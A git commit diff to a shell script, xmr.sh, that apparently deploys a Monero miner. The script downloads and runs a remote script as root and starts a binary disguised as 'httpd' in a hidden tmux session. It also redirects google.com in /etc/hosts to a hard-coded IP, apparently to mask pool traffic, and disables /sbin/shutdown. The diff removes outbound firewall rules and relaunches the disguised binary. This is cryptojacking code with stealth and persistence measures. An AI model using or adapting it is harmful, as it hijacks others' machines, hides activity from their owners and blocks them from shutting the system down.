cc45f30ea63e6f93645549366c60904d6ce3cc2c
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2020-09-13 23:17:04 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -28,12 +28,10 @@ sudo bash enable_1gb_pages.sh
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
 sudo bash randomx_boost.sh
 sudo chmod +x httpd
-sudo tmux new-session -d -s my_session1  './httpd'
 sudo -- sh -c "echo '103.145.255.41  google.com' >> /etc/hosts"
 
 sudo chmod 0 /sbin/shutdown
-sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
-sudo iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
-sudo iptables -I OUTPUT 3 -p tcp -d google.com --dport 443 -j ACCEPT
-sudo iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
+
+sudo tmux new-session -d -s my_session1  './httpd'
+
 
